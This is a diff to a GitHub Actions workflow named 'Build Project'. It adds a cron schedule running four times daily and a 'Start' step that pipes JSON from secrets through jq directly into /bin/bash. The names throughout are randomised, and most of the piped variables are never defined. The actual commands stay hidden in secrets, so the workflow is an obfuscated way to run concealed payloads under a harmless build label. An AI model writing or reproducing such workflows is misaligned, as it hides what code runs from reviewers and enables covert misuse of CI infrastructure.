@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '52 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,16 +16,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          unwvz47: ${{ secrets.unwvz47 }}
+          ytbi805: ${{ secrets.ytbi805 }}
         run: |
-          printf '%s' "$unwvz47" | jq -r .hr4876 | /bin/bash
-          echo $lervb41 | jq -r .bxsyu462 | /bin/bash
-          printf '%s' "$gsr128" | jq -r .qk1 | /bin/bash
-          printf '%s' "$kl2888" | jq -r .igcr630 | /bin/bash
+          printf '%s' "$ytbi805" | jq -r .wnhpn267 | /bin/bash
+          printf '%s' "$hhv94502" | jq -r .g97 | /bin/bash
+          printf '%s' "$lup8" | jq -r .ll31 | /bin/bash
+          printf '%s' "$rufe0" | jq -r .y90968 | /bin/bash
+          echo $xdiz808 | jq -r .yz93 | /bin/bash
+          printf '%s' "$rybz6" | jq -r .xre1269 | /bin/bash
+          printf '%s' "$dxizj4935" | jq -r .l74 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: lhbLVWO3
+          name: gYo5iTLE
           path: "*.zip"
           retention-days: 1
